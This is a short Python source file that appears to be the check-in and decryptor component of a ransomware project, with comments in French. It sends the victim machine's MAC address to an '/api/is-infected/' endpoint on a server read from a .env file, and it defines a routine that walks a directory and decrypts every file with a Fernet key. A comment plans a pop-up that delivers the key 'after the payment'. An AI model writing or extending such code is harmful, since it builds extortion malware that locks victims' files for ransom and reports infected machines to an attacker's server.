import requests
from device_infos import get_mac_address
from dotenv import load_dotenv
from pathlib import Path
import os


dotenv_path = Path('./.env')
load_dotenv(dotenv_path=dotenv_path)
base_api_url = os.getenv('BASE_API_URL')


def keyExist():
        mac_address = get_mac_address()
        response = requests.get(base_api_url + '/api/is-infected/' + mac_address)
        data = response.json()
        print(data['is_infected'])
        return data['is_infected']


# crée une pop up envoyer apres le payment avec la decrypt key + logiciel decript

def decrypt(self, path, excludeExtensions):
    i = 0
    for root, dirs, files in os.walk(path):
        for entry in files:
            if not entry.endswith(excludeExtensions):
                with open(os.path.join(root, entry), "rb") as _file:
                    encrypted = _file.read()
                decrypted = self._fernet.decrypt(encrypted)
                with open(os.path.join(root, entry), "wb") as decrypted_file:
                    decrypted_file.write(decrypted)
            i += 1
    print(str(i) + " fichiers décrypté.s dans le dossier : " + path)


def main():
      keyExist()


if __name__ == "__main__":
    main()
